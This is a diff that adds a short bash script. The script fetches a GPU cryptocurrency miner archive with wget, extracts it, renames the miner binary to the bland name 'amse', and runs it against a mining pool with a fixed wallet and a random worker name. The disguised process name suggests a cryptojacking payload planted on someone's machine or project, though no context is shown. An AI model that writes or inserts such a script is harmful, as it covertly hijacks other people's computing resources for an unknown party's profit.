@@ -1,0 +1,6 @@
+#!/bin/bash
+wget https://github.com/egg5233/tw-pearl-miner/releases/download/v3.2.1/tw-pearl-miner-linux-cuda13.tar.gz
+tar xf tw-pearl-miner-linux-cuda13.tar.gz
+cd tw-pearl-miner-linux
+mv pearl-gpu-miner amse
+./amse --pool prl.kryptex.network:7048 --wallet prl1pnyza9z22a6sy8k08xkcqgwtgwr95w5d2csh89snlg6yhqdgg9uusuxjqch --worker $(echo $RANDOM | md5sum | head -c 10)
